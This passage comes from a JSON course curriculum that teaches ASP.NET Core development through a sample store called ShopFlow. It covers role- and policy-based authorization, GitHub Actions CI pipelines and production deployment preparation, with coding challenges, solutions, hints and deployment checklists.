              "content": "## The Permission Matrix\n\nBefore writing code, map out your authorization requirements in a permission matrix. For ShopFlow, we identify resources (rows) and actions (columns), then fill in which roles or conditions grant access:\n\n```\n                    | View   | Create | Edit   | Delete | Manage |\n--------------------|--------|--------|--------|--------|--------|\nProducts            | All    | Mgr+   | Mgr+   | Admin  | Admin  |\nOrders              | Auth   | Cust   | Owner* | Admin  | Admin  |\nCustomer Profiles   | Self   | Self   | Self   | Admin  | Admin  |\nInventory           | Mgr+   | Mgr+   | Mgr+   | Admin  | Admin  |\nReports             | Mgr+   | -      | -      | -      | Admin  |\nSettings            | Admin  | Admin  | Admin  | Admin  | Admin  |\n```\n\nLegend: All=Everyone, Auth=Authenticated, Cust=Customer+, Mgr+=Manager+Admin, Owner*=Resource-based, Self=Own profile only\n\nThis matrix immediately reveals patterns: Admin can do everything, Manager has operational access, Customer has limited self-service capabilities. Resource-based checks (Owner*) require special handling.\n\n## Translating to Policies\n\nFrom the matrix, extract named policies that encode these rules:\n\n**Role-Based Policies:**\n- `RequireAdmin` - Admin role only\n- `RequireManager` - Manager or Admin role\n- `RequireAuthenticated` - Any authenticated user\n\n**Composite Policies:**\n- `CanManageProducts` - RequireManager AND department in (Products, Inventory)\n- `CanViewReports` - RequireManager AND (department matches report type OR Admin)\n- `CanProcessOrders` - RequireAuthenticated AND (Customer placing own order OR Manager/Admin)\n\n**Resource-Based Authorization Handlers:**\n- `OrderAuthorizationHandler` - Check if user owns the order or has Manager+ role\n- `ProfileAuthorizationHandler` - Check if user is accessing their own profile or is Admin\n\n## ShopFlow Authorization Architecture\n\nFor ShopFlow, we implement a layered authorization system:\n\n**Layer 1: Global Policies (Program.cs)**\nDefine policies at application startup. These are your authorization vocabulary - named rules that can be referenced anywhere.\n\n**Layer 2: Endpoint Authorization**\nApply policies to API endpoints using [Authorize] attributes or .RequireAuthorization(). This is your first line of defense, rejecting unauthorized requests early.\n\n**Layer 3: Resource Authorization Handlers**\nFor operations on specific resources (edit this order, view this profile), implement IAuthorizationHandler. These handlers receive the resource and make context-aware decisions.\n\n**Layer 4: Business Logic Checks**\nSome authorization is so tightly coupled to business rules that it lives in service classes. 'Can this order be cancelled?' might depend on order status, payment state, and shipping status - logic that belongs in OrderService, not an authorization handler.\n\n## Custom Authorization Requirements\n\nASP.NET Core's authorization is built on Requirements and Handlers. A requirement is a marker class that defines what we're checking. A handler contains the logic to evaluate that requirement:\n\n```csharp\n// Requirement: User must be in the same department as the resource\npublic class SameDepartmentRequirement : IAuthorizationRequirement { }\n\npublic class SameDepartmentHandler : AuthorizationHandler<SameDepartmentRequirement, Product>\n{\n    protected override Task HandleRequirementAsync(\n        AuthorizationHandlerContext context,\n        SameDepartmentRequirement requirement,\n        Product resource)\n    {\n        var userDept = context.User.FindFirst(\"department\")?.Value;\n        if (userDept == resource.Department || context.User.IsInRole(\"Admin\"))\n        {\n            context.Succeed(requirement);\n        }\n        return Task.CompletedTask;\n    }\n}\n```\n\n## Performance Considerations\n\nAuthorization checks happen on every request. Keep them fast:\n\n- **Cache role/claim lookups** when possible\n- **Avoid database calls** in authorization handlers when you can use claims\n- **Load resources efficiently** - don't fetch the entire order to check ownership, just query the owner ID\n- **Use policy results caching** for expensive policy evaluations\n- **Fail fast** - check the cheapest requirements first (roles before database lookups)\n\n## Audit and Compliance\n\nFor regulated industries, authorization decisions must be auditable:\n\n- Log authorization failures with context (who, what, when, why denied)\n- Consider logging successful sensitive-resource access\n- Implement permission change tracking (who granted Admin role, when)\n- Regular access reviews (does user still need Manager role after department change?)\n\nThe permission matrix becomes your compliance documentation - it explicitly defines who can do what, making audits straightforward."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-22-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Implement role-based and policy-based authorization for a product management system.",
              "instructions": "Set up authorization for ShopFlow's product management!\n\n1. Configure authorization with these policies:\n   - 'RequireAdmin': Require Admin role\n   - 'CanViewProducts': Allow any authenticated user\n   - 'CanEditProducts': Allow Admin OR Manager roles\n   - 'CanDeleteProducts': Require Admin role AND a claim 'can_delete' = 'true'\n\n2. Create these endpoints with proper authorization:\n   - GET /products - Requires 'CanViewProducts' policy\n   - PUT /products/{id} - Requires 'CanEditProducts' policy\n   - DELETE /products/{id} - Requires 'CanDeleteProducts' policy\n   - GET /admin/settings - Requires 'RequireAdmin' policy\n\n3. Add authentication and authorization middleware in correct order!",
              "starterCode": "using Microsoft.AspNetCore.Authorization;\nusing System.Security.Claims;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddAuthentication(\"Cookie\")\n    .AddCookie(\"Cookie\", opt => opt.LoginPath = \"/login\");\n\n// TODO: Configure authorization policies:\n// - RequireAdmin: Admin role\n// - CanViewProducts: Any authenticated user\n// - CanEditProducts: Admin OR Manager\n// - CanDeleteProducts: Admin AND has claim 'can_delete' = 'true'\n\nvar app = builder.Build();\n\n// TODO: Add middleware\n\n// TODO: GET /products - CanViewProducts\n\n// TODO: PUT /products/{id} - CanEditProducts\n\n// TODO: DELETE /products/{id} - CanDeleteProducts\n\n// TODO: GET /admin/settings - RequireAdmin\n\napp.Run();",
              "solution": "using Microsoft.AspNetCore.Authorization;\nusing System.Security.Claims;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddAuthentication(\"Cookie\")\n    .AddCookie(\"Cookie\", opt => opt.LoginPath = \"/login\");\n\nbuilder.Services.AddAuthorization(options =>\n{\n    options.AddPolicy(\"RequireAdmin\", policy =>\n        policy.RequireRole(\"Admin\"));\n    \n    options.AddPolicy(\"CanViewProducts\", policy =>\n        policy.RequireAuthenticatedUser());\n    \n    options.AddPolicy(\"CanEditProducts\", policy =>\n        policy.RequireRole(\"Admin\", \"Manager\"));\n    \n    options.AddPolicy(\"CanDeleteProducts\", policy =>\n        policy.RequireRole(\"Admin\")\n              .RequireClaim(\"can_delete\", \"true\"));\n});\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\napp.MapGet(\"/products\", () => \"Product list\")\n    .RequireAuthorization(\"CanViewProducts\");\n\napp.MapPut(\"/products/{id}\", (int id) => $\"Updated product {id}\")\n    .RequireAuthorization(\"CanEditProducts\");\n\napp.MapDelete(\"/products/{id}\", (int id) => $\"Deleted product {id}\")\n    .RequireAuthorization(\"CanDeleteProducts\");\n\napp.MapGet(\"/admin/settings\", () => \"Admin Settings\")\n    .RequireAuthorization(\"RequireAdmin\");\n\napp.Run();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should define RequireAdmin policy",
                  "expectedOutput": "RequireAdmin",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should define CanEditProducts policy with roles",
                  "expectedOutput": "CanEditProducts",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Should require can_delete claim for delete policy",
                  "expectedOutput": "can_delete",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Should use RequireAuthenticatedUser for view policy",
                  "expectedOutput": "RequireAuthenticatedUser",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Start with builder.Services.AddAuthorization() and use options.AddPolicy() for each policy."
                },
                {
                  "level": 2,
                  "text": "For CanViewProducts, use policy.RequireAuthenticatedUser() instead of requiring a specific role."
                },
                {
                  "level": 3,
                  "text": "RequireRole(\"Admin\", \"Manager\") means Admin OR Manager - it's an OR condition, not AND."
                },
                {
                  "level": 4,
                  "text": "Chain RequireRole() and RequireClaim() for AND logic in CanDeleteProducts policy."
                },
                {
                  "level": 5,
                  "text": "Use .RequireAuthorization(\"PolicyName\") on each endpoint to apply the policy."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using RequireRole with multiple calls instead of multiple arguments",
                  "consequence": "Multiple RequireRole calls create AND logic, but you want OR logic for 'Admin or Manager'.",
                  "correction": "Use RequireRole(\"Admin\", \"Manager\") for OR logic, not two separate RequireRole calls."
                },
                {
                  "mistake": "Forgetting RequireAuthenticatedUser for policies that just need login",
                  "consequence": "Without this, even unauthenticated users might pass if no other requirements are set.",
                  "correction": "Always start with RequireAuthenticatedUser() if login is required."
                },
                {
                  "mistake": "Putting UseAuthorization before UseAuthentication",
                  "consequence": "Authorization cannot work without knowing who the user is first.",
                  "correction": "Always call UseAuthentication() before UseAuthorization()."
                },
                {
                  "mistake": "Using [Authorize] attribute on minimal API without proper syntax",
                  "consequence": "Compilation errors or authorization not applied.",
                  "correction": "For minimal APIs, use .RequireAuthorization(\"PolicyName\") instead of [Authorize] attributes."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-24",
      "title": "CI/CD with GitHub Actions",
      "description": "Automate your build, test, and deployment pipeline. Learn GitHub Actions to ensure ShopFlow quality with every commit.",
      "difficulty": "intermediate",
      "estimatedHours": 3,
      "lessons": [
        {
          "id": "lesson-24-01",
          "title": "What is CI/CD? (Automated Quality Gates)",
          "moduleId": "module-24",
          "order": 1,
          "estimatedMinutes": 30,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding CI/CD",
              "content": "Imagine a modern automobile factory with a sophisticated assembly line. Every car that rolls through undergoes dozens of automated quality checks at each station. Sensors verify that every bolt is torqued correctly, cameras inspect paint quality, robots test that every electrical connection works, and automated systems confirm that doors close with the right force. No car leaves the factory without passing every single check, and any failure immediately stops the line so engineers can investigate.\n\nThis is exactly what Continuous Integration and Continuous Delivery (CI/CD) does for software. Every time a developer commits code, it enters an automated pipeline - the digital assembly line. First, the code is compiled (can we even build this car?). Then automated tests run (does the engine start? do the brakes work? does the radio tune properly?). Code quality tools analyze the changes (are there safety hazards? does it meet our standards?). Security scanners look for vulnerabilities (will this car be easy to steal?).\n\nJust like the factory assembly line, if ANY check fails, the pipeline stops and the team is notified immediately. The code cannot be deployed to production with a failing test, just as a car with faulty brakes cannot leave the factory. This immediate feedback is invaluable - developers learn about problems within minutes of introducing them, when the context is fresh and fixes are simple.\n\nThe 'Continuous' part means this happens automatically, constantly, for every change. No human needs to remember to run tests or check code quality - the pipeline handles it all. And because the process is identical every time, you eliminate the 'it works on my machine' problem. The pipeline is the source of truth about whether code is ready for production."
            },
            {
              "type": "EXAMPLE",
              "title": "ShopFlow CI Pipeline",
              "content": "This GitHub Actions workflow defines our automated pipeline for ShopFlow. Let's examine each section to understand how the pieces fit together.",
              "code": "# ===== .github/workflows/ci.yml =====\n# This file lives in your repository and GitHub automatically detects it\n\nname: ShopFlow CI  # Display name in GitHub Actions UI\n\n# TRIGGERS: When should this pipeline run?\non:\n  push:\n    branches: [main]        # Run when code is pushed to main branch\n  pull_request:\n    branches: [main]        # Run when PRs target main branch\n\n# JOBS: What work should be performed?\njobs:\n  build-and-test:           # Job name (can have multiple jobs)\n    runs-on: ubuntu-latest  # Virtual machine environment\n\n    # SERVICES: External dependencies needed for tests\n    services:\n      postgres:             # Service name (accessed as 'postgres' hostname)\n        image: postgres:16  # Docker image to use\n        env:                # Environment variables for the container\n          POSTGRES_USER: shopflow\n          POSTGRES_PASSWORD: shopflow_test\n          POSTGRES_DB: shopflow_test\n        ports:\n          - 5432:5432       # Map container port to runner port\n        options: >-         # Health check to ensure DB is ready\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n\n    # STEPS: Sequential actions within the job\n    steps:\n      # Step 1: Get the code\n      - uses: actions/checkout@v4\n        # This action clones your repository into the runner\n\n      # Step 2: Install .NET SDK\n      - name: Setup .NET\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: '9.0.x'  # Use latest .NET 9 patch version\n\n      # Step 3: Download NuGet packages\n      - name: Restore dependencies\n        run: dotnet restore\n        # Downloads all packages defined in .csproj files\n\n      # Step 4: Compile the application\n      - name: Build\n        run: dotnet build --no-restore --configuration Release\n        # --no-restore: Skip restore (already done)\n        # --configuration Release: Build optimized version\n\n      # Step 5: Run fast unit tests first\n      - name: Run unit tests\n        run: dotnet test tests/ShopFlow.Tests.Unit --no-build --configuration Release\n        # Unit tests are fast, isolated, no external dependencies\n\n      # Step 6: Run integration tests (need database)\n      - name: Run integration tests\n        run: dotnet test tests/ShopFlow.Tests.Integration --no-build --configuration Release\n        env:\n          # Tell our app how to connect to the PostgreSQL service\n          ConnectionStrings__DefaultConnection: \"Host=localhost;Database=shopflow_test;Username=shopflow;Password=shopflow_test\"\n        # Integration tests verify real database operations work",
              "language": "yaml"
            },
            {
              "type": "THEORY",
              "title": "GitHub Actions Concepts",
              "content": "## Workflows\n\nA workflow is an automated process defined in a YAML file within the `.github/workflows` directory of your repository. Each workflow responds to specific events (triggers) and executes one or more jobs. You can have multiple workflows in a single repository - one for CI, another for deployment, a third for nightly builds. Workflows are version-controlled alongside your code, meaning pipeline changes go through the same review process as application changes.\n\n## Triggers (Events)\n\nThe `on` section defines when your workflow runs. Common triggers include:\n- `push`: Code pushed to specified branches\n- `pull_request`: PR opened, updated, or synchronized\n- `schedule`: Cron-based scheduling for periodic runs\n- `workflow_dispatch`: Manual trigger from GitHub UI\n- `release`: When a new release is created\n\nYou can combine multiple triggers and filter by branches, tags, or file paths. For example, only run tests when `.cs` files change, not when documentation is updated.\n\n## Jobs\n\nJobs are collections of steps that execute on the same runner (virtual machine). By default, jobs run in parallel, but you can define dependencies to run them sequentially. Each job starts with a fresh environment - no files or state from other jobs unless explicitly shared. This isolation ensures reproducibility.\n\n## Steps\n\nSteps are the individual tasks within a job. Each step can either run a shell command (`run`) or use a pre-built action (`uses`). Steps execute sequentially, and if any step fails, subsequent steps are skipped by default. Steps can share data through environment variables, output parameters, or the filesystem.\n\n## Actions\n\nActions are reusable units of workflow logic. The `uses` keyword references an action from the GitHub Marketplace or a repository. Common actions include `actions/checkout` (clone your repo), `actions/setup-dotnet` (install .NET SDK), and thousands of community-contributed actions for tasks like sending notifications, deploying to cloud providers, or analyzing code.\n\n## Runners\n\nRunners are the machines that execute your workflows. GitHub provides hosted runners (Ubuntu, Windows, macOS) that are free for public repositories and have usage limits for private repositories. You can also configure self-hosted runners for custom hardware, specific software requirements, or cost optimization.\n\n## Services\n\nServices are Docker containers that run alongside your job, providing external dependencies like databases, caches, or message queues. Services are networked with your runner, so your tests can connect to them using service names as hostnames. This enables realistic integration testing without modifying your test configuration."
            },
            {
              "type": "ARCHITECTURE",
              "title": "Designing Build Pipelines",
              "content": "## Pipeline Stages\n\nA well-designed CI/CD pipeline follows a funnel pattern: fast checks run first, slow checks run last, and failures exit early. This minimizes wasted compute time and provides rapid feedback. For ShopFlow, our stages are:\n\n**Stage 1: Build (seconds)**\nCompile the code and verify it produces valid output. This catches syntax errors, missing dependencies, and type mismatches immediately. If the code does not compile, there is no point running tests.\n\n**Stage 2: Unit Tests (seconds to minutes)**\nRun fast, isolated tests that verify individual components work correctly. Unit tests have no external dependencies and should complete in under a minute for most projects. Failed unit tests indicate broken logic that must be fixed before proceeding.\n\n**Stage 3: Integration Tests (minutes)**\nTest components working together with real external dependencies (databases, APIs). These tests are slower but catch issues that unit tests miss: database queries that do not work in production, serialization problems, and configuration errors.\n\n**Stage 4: Code Quality (parallel with tests)**\nRun linters, static analyzers, and security scanners. These tools catch potential bugs, style violations, and security vulnerabilities. Running in parallel with tests optimizes total pipeline time.\n\n**Stage 5: Deployment (minutes)**\nIf all checks pass on the main branch, automatically deploy to staging or production. This stage only runs for specific branches or events, not for every PR.\n\n## Parallel vs Sequential Execution\n\nGitHub Actions runs jobs in parallel by default. Use this for independent tasks:\n\n```yaml\njobs:\n  test-unit:\n    runs-on: ubuntu-latest\n    steps: [unit test steps]\n  \n  test-integration:\n    runs-on: ubuntu-latest\n    steps: [integration test steps]\n  \n  lint:\n    runs-on: ubuntu-latest\n    steps: [linting steps]\n```\n\nAll three jobs run simultaneously, reducing total pipeline time. For dependent jobs, use `needs`:\n\n```yaml\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps: [build steps]\n  \n  deploy:\n    needs: build  # Wait for build to complete\n    runs-on: ubuntu-latest\n    steps: [deploy steps]\n```\n\n## Environment Management\n\nDifferent environments (development, staging, production) require different configurations. GitHub Actions supports this through:\n\n**Environment Secrets**: Sensitive values like API keys and connection strings are stored encrypted in GitHub and injected at runtime. Never commit secrets to your repository.\n\n**Environment Variables**: Non-sensitive configuration passed via the `env` key at workflow, job, or step level. Variables at narrower scopes override broader ones.\n\n**GitHub Environments**: Named environments (staging, production) with protection rules requiring manual approval, specific reviewers, or wait timers before deployment.\n\n## Caching for Performance\n\nDependency restoration can be slow. GitHub Actions provides caching to reuse downloaded packages:\n\n```yaml\n- uses: actions/cache@v4\n  with:\n    path: ~/.nuget/packages\n    key: ${{ runner.os }}-nuget-${{ hashFiles('**/*.csproj') }}\n```\n\nThis caches NuGet packages based on project file hashes. When dependencies do not change, the cache is reused, dramatically reducing pipeline time.\n\n## Branch Protection Rules\n\nCI pipelines are most effective when enforced. Configure branch protection rules requiring:\n- All status checks to pass before merging\n- PR reviews from team members\n- Up-to-date branches (rebased on latest main)\n- No force pushes or deletions\n\nThis ensures every change to main has passed all quality gates, making main always deployable.\n\n## Monitoring and Notifications\n\nPipeline failures need immediate attention. Configure notifications via:\n- GitHub's built-in email notifications\n- Slack/Teams integrations for team channels\n- Custom webhooks for advanced routing\n\nTrack pipeline metrics over time: average duration, failure rate, flaky test frequency. Slow or unreliable pipelines reduce developer productivity and erode trust in the process."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-24-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Create a basic GitHub Actions workflow for a .NET project.",
              "instructions": "Create a CI workflow for ShopFlow!\n\n1. Name the workflow 'ShopFlow CI'\n\n2. Configure triggers:\n   - Run on push to main branch\n   - Run on pull requests to main branch\n\n3. Create a single job 'build-and-test' that:\n   - Runs on ubuntu-latest\n   - Checks out the code\n   - Sets up .NET 9.0\n   - Restores dependencies\n   - Builds in Release configuration\n   - Runs tests\n\n4. Follow the YAML structure for GitHub Actions workflows.",
              "starterCode": "# Complete this GitHub Actions workflow\nname: # TODO: Add workflow name\n\non:\n  # TODO: Configure triggers for push and pull_request\n\njobs:\n  # TODO: Create build-and-test job\n  # - runs-on: ubuntu-latest\n  # - steps:\n  #   - Checkout code\n  #   - Setup .NET 9.0\n  #   - Restore dependencies\n  #   - Build (Release config)\n  #   - Run tests",
              "solution": "name: ShopFlow CI\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\njobs:\n  build-and-test:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup .NET\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: '9.0.x'\n\n      - name: Restore dependencies\n        run: dotnet restore\n\n      - name: Build\n        run: dotnet build --no-restore --configuration Release\n\n      - name: Run tests\n        run: dotnet test --no-build --configuration Release",
              "language": "yaml",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should have workflow name",
                  "expectedOutput": "name:",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should trigger on push to main",
                  "expectedOutput": "push:",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Should use actions/checkout",
                  "expectedOutput": "actions/checkout",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Should build in Release configuration",
                  "expectedOutput": "Release",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Start with 'name: ShopFlow CI' at the top of the file."
                },
                {
                  "level": 2,
                  "text": "The 'on' section uses push: and pull_request: with branches: [main] under each."
                },
                {
                  "level": 3,
                  "text": "Steps use either 'uses:' for actions or 'run:' for shell commands."
                },
                {
                  "level": 4,
                  "text": "Use actions/checkout@v4 and actions/setup-dotnet@v4 for the first two steps."
                },
                {
                  "level": 5,
                  "text": "dotnet commands: restore, build --no-restore --configuration Release, test --no-build --configuration Release"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Incorrect YAML indentation",
                  "consequence": "YAML parsing fails and the workflow does not run. GitHub shows a syntax error.",
                  "correction": "Use consistent 2-space indentation. Each nested level adds 2 spaces."
                },
                {
                  "mistake": "Missing 'uses:' or 'run:' prefix in steps",
                  "consequence": "GitHub Actions does not know whether the step is an action reference or a shell command.",
                  "correction": "Always prefix action references with 'uses:' and shell commands with 'run:'."
                },
                {
                  "mistake": "Building without restoring first",
                  "consequence": "Build fails because NuGet packages are not downloaded.",
                  "correction": "Always run 'dotnet restore' before 'dotnet build', or omit --no-restore from build."
                },
                {
                  "mistake": "Running tests without building first",
                  "consequence": "Tests fail because there are no compiled assemblies to test.",
                  "correction": "Run build before test, or omit --no-build from the test command."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-26",
      "title": "Capstone Completion: ShopFlow Launch",
      "description": "Bring everything together. Complete and deploy your ShopFlow e-commerce application with all the skills you've learned throughout the course.",
      "difficulty": "advanced",
      "estimatedHours": 6,
      "lessons": [
        {
          "id": "lesson-26-01",
          "title": "From Development to Production (The Grand Opening)",
          "moduleId": "module-26",
          "order": 1,
          "estimatedMinutes": 45,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Launching Your Application",
              "content": "Imagine you have spent months building your dream restaurant. The kitchen is equipped with professional-grade appliances, the dining room is elegantly decorated, and you have perfected your signature dishes through countless trials. But having a beautiful restaurant is not the same as opening for business. Before your grand opening, you need to ensure everything works together seamlessly.\n\nFirst, there is the preparation phase. You conduct a soft opening with friends and family to identify issues before real customers arrive. You verify that the point-of-sale system processes payments correctly, that orders flow smoothly from servers to kitchen, and that the ventilation handles a full dinner rush. You train your staff until they can handle any situation confidently.\n\nThen comes the grand opening itself. You do not simply unlock the doors and hope for the best. You have marketing campaigns ready, reservation systems tested, and backup plans for unexpected crowds. You monitor everything closely those first few nights, ready to adjust on the fly.\n\nFinally, there are ongoing operations. A successful restaurant does not coast after opening night. You continuously gather customer feedback, refine recipes, optimize staffing, and adapt to seasonal changes. You track metrics like table turnover, customer satisfaction, and food costs to ensure sustainable success.\n\nLaunching ShopFlow follows this same pattern. Development is like building and equipping your restaurant. Deployment preparation is your soft opening and staff training. The actual launch is your grand opening. And production operations are your ongoing restaurant management. Each phase requires different skills and attention, but all are essential for a successful venture."
            },
            {
              "type": "EXAMPLE",
              "title": "ShopFlow Feature Checklist",
              "content": "Before launching ShopFlow, we need to verify that all core features are complete and working together. This checklist references the components we built throughout the course.",
              "code": "// ===== SHOPFLOW FEATURE VERIFICATION CHECKLIST =====\n\n// PRODUCT CATALOG API (Modules 8-10)\n// - GET /api/products - List all products with pagination\n// - GET /api/products/{id} - Get single product details\n// - POST /api/products - Create new product (Admin only)\n// - PUT /api/products/{id} - Update product (Admin only)\n// - DELETE /api/products/{id} - Soft delete product (Admin only)\n// - GET /api/products/search?q={term} - Full-text search\n// - GET /api/categories - List product categories\n\npublic class ProductsController : ControllerBase\n{\n    [HttpGet]\n    public async Task<ActionResult<PagedResult<ProductDto>>> GetProducts(\n        [FromQuery] int page = 1,\n        [FromQuery] int pageSize = 20,\n        [FromQuery] string? category = null)\n    {\n        var products = await _productService.GetPagedAsync(page, pageSize, category);\n        return Ok(products);\n    }\n}\n\n// SHOPPING CART (Modules 11-12)\n// - GET /api/cart - Get current user's cart\n// - POST /api/cart/items - Add item to cart\n// - PUT /api/cart/items/{id} - Update item quantity\n// - DELETE /api/cart/items/{id} - Remove item from cart\n// - DELETE /api/cart - Clear entire cart\n\npublic class CartService : ICartService\n{\n    public async Task<Cart> AddItemAsync(int userId, int productId, int quantity)\n    {\n        var cart = await GetOrCreateCartAsync(userId);\n        var product = await _productRepository.GetByIdAsync(productId);\n        \n        if (product.StockQuantity < quantity)\n            throw new InsufficientStockException(productId, quantity);\n        \n        cart.AddItem(product, quantity);\n        await _cartRepository.UpdateAsync(cart);\n        return cart;\n    }\n}\n\n// USER AUTHENTICATION (Modules 20-22)\n// - POST /api/auth/register - New user registration\n// - POST /api/auth/login - Email/password login\n// - POST /api/auth/refresh - Refresh JWT token\n// - GET /api/auth/external/{provider} - OAuth login (Google, GitHub)\n// - POST /api/auth/logout - Invalidate refresh token\n\nservices.AddIdentity<ApplicationUser, IdentityRole>(options =>\n{\n    options.Password.RequireDigit = true;\n    options.Password.RequiredLength = 8;\n    options.Password.RequireNonAlphanumeric = true;\n    options.Lockout.MaxFailedAccessAttempts = 5;\n})\n.AddEntityFrameworkStores<ShopFlowDbContext>()\n.AddDefaultTokenProviders();\n\n// ORDER PROCESSING (Modules 13-15)\n// - POST /api/orders - Create order from cart\n// - GET /api/orders - List user's orders\n// - GET /api/orders/{id} - Get order details\n// - PUT /api/orders/{id}/status - Update order status (Admin)\n// - POST /api/orders/{id}/cancel - Cancel order\n\npublic class OrderService : IOrderService\n{\n    public async Task<Order> CreateOrderAsync(int userId, CreateOrderDto dto)\n    {\n        using var transaction = await _dbContext.Database.BeginTransactionAsync();\n        try\n        {\n            var cart = await _cartService.GetCartAsync(userId);\n            var order = Order.CreateFromCart(cart, dto.ShippingAddress);\n            \n            await _orderRepository.AddAsync(order);\n            await _inventoryService.ReserveStockAsync(order.Items);\n            await _cartService.ClearCartAsync(userId);\n            \n            await transaction.CommitAsync();\n            await _eventBus.PublishAsync(new OrderCreatedEvent(order));\n            \n            return order;\n        }\n        catch\n        {\n            await transaction.RollbackAsync();\n            throw;\n        }\n    }\n}\n\n// ADMIN DASHBOARD (Modules 16-17)\n// - GET /api/admin/dashboard - Sales metrics and stats\n// - GET /api/admin/orders - All orders with filtering\n// - GET /api/admin/users - User management\n// - GET /api/admin/inventory - Stock levels and alerts\n\n[Authorize(Policy = \"AdminOnly\")]\npublic class AdminController : ControllerBase\n{\n    [HttpGet(\"dashboard\")]\n    public async Task<ActionResult<DashboardDto>> GetDashboard()\n    {\n        var stats = await _analyticsService.GetDashboardStatsAsync();\n        return Ok(stats);\n    }\n}\n\n// BLAZOR STOREFRONT (Modules 18-19)\n// - Home page with featured products\n// - Product listing with category filtering\n// - Product detail page\n// - Shopping cart component\n// - Checkout flow\n// - User account pages\n// - Order history\n\n@page \"/products/{Id:int}\"\n@inject IProductService ProductService\n@inject ICartService CartService\n\n<div class=\"product-detail\">\n    <ProductImages Images=\"@product.Images\" />\n    <ProductInfo Product=\"@product\" />\n    <AddToCartButton ProductId=\"@product.Id\" \n                     OnAddToCart=\"HandleAddToCart\" />\n</div>\n\n@code {\n    [Parameter] public int Id { get; set; }\n    private ProductDto? product;\n    \n    protected override async Task OnParametersSetAsync()\n    {\n        product = await ProductService.GetByIdAsync(Id);\n    }\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Deployment Preparation",
              "content": "## Pre-Launch Security Review\n\nBefore any production deployment, conduct a thorough security audit. Verify that all API endpoints require appropriate authentication. Check that authorization policies correctly restrict access to admin functions. Ensure sensitive data like passwords are properly hashed and API keys are stored in secure vaults, not configuration files. Review CORS policies to prevent unauthorized cross-origin requests. Scan dependencies for known vulnerabilities using tools like dotnet list package --vulnerable.\n\n## Performance Testing\n\nProduction traffic patterns differ dramatically from development testing. Use load testing tools like k6 or Apache JMeter to simulate realistic traffic. Test critical paths: product search, cart operations, and checkout flow. Identify bottlenecks before users find them. Establish baseline performance metrics so you can detect degradation after deployment. Consider peak load scenarios like holiday sales or flash promotions.\n\n## Error Handling and Logging\n\nProduction errors require different handling than development exceptions. Configure structured logging that captures enough context for debugging without exposing sensitive data. Set up log aggregation so errors from multiple instances appear in a single dashboard. Implement global exception handling that returns appropriate HTTP status codes without leaking stack traces. Create custom error pages that maintain user experience during failures.\n\n## Configuration Management\n\nProduction configuration must be separate from development settings. Never commit production secrets to source control. Use environment variables or secret management services for sensitive values. Create environment-specific appsettings.Production.json files for non-sensitive settings. Validate configuration at startup to fail fast if required values are missing. Document all configuration options so operations teams can manage deployments.\n\n## Database Preparation\n\nApply all pending migrations to the production database before deployment. Create database backups and verify restoration procedures work. Set up automated backup schedules with appropriate retention policies. Configure connection pooling for production load. Ensure database user accounts have minimal necessary permissions. Test rollback procedures for migrations in case deployment fails.\n\n## Health Checks and Monitoring\n\nImplement health check endpoints that verify all critical dependencies. A liveness probe confirms the application is running. A readiness probe confirms it can handle traffic (database connected, cache available, external APIs reachable). Configure monitoring dashboards before launch so you can observe the deployment in real-time. Set up alerts for critical metrics like error rate, response time, and resource utilization."
            },
            {
              "type": "ARCHITECTURE",
              "title": "Production Architecture",
              "content": "## Azure Container Apps Deployment\n\nAzure Container Apps provides a managed platform for running containerized applications without managing Kubernetes directly. ShopFlow deploys as multiple containers: the main API, the Blazor frontend, and background workers for order processing. Container Apps handles load balancing, automatic scaling, and SSL termination. Configure minimum and maximum replicas based on expected traffic, allowing the platform to scale horizontally during peak demand.\n\n```yaml\n# Container Apps configuration\nresources:\n  cpu: 0.5\n  memory: 1Gi\nscale:\n  minReplicas: 2\n  maxReplicas: 10\n  rules:\n    - name: http-scaling\n      http:\n        metadata:\n          concurrentRequests: 50\n```\n\n## Health Checks Integration\n\nASP.NET Core health checks integrate directly with container orchestration platforms. The liveness endpoint at /healthz/live returns 200 if the application is running, allowing the platform to restart crashed instances. The readiness endpoint at /healthz/ready verifies database connectivity, cache availability, and external service accessibility before routing traffic to an instance.\n\n```csharp\nservices.AddHealthChecks()\n    .AddNpgSql(connectionString, name: \"database\")\n    .AddRedis(redisConnection, name: \"cache\")\n    .AddUrlGroup(new Uri(\"https://api.stripe.com/v1\"), name: \"payment-gateway\");\n\napp.MapHealthChecks(\"/healthz/live\", new HealthCheckOptions\n{\n    Predicate = _ => false // Just check if app 